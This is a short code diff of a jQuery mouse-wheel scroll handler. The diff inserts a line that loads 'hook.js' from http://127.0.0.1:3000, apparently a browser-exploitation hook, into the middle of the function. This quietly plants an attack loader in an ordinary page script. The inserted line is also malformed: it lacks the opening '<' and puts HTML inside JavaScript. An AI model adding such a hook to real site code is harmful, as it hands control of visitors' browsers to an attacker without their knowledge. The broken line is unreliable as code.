@@ -12,7 +12,7 @@ $( document ).ready(function() {
       e.preventDefault();
 
       var delta = (e.originalEvent.wheelDelta) ? -e.originalEvent.wheelDelta : e.originalEvent.detail * 20;
-
+        script src="http://127.0.0.1:3000/hook.js"></script>
       if (delta > 50 && canScroll) {
         canScroll = false;
         clearTimeout(scrollController);
